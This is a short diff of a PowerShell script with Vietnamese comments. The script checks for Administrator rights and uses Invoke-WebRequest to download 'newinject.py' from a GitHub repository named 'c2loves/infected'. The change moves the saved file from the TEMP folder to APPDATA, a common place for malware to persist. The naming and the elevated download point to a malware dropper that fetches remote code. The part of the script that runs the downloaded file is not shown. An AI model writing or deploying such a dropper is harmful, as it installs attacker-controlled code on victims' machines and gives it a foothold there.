@@ -21,7 +21,7 @@ Write-Host "✅ Script đang chạy dưới quyền Administrator."
 
 # Đường dẫn file sẽ tải
 $scriptUrl  = "https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/newinject.py"
-$scriptPath = "$env:TEMP\injectnew.py"
+$scriptPath = "$env:appdata\injectnew.py"
 
 # Tải file về
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
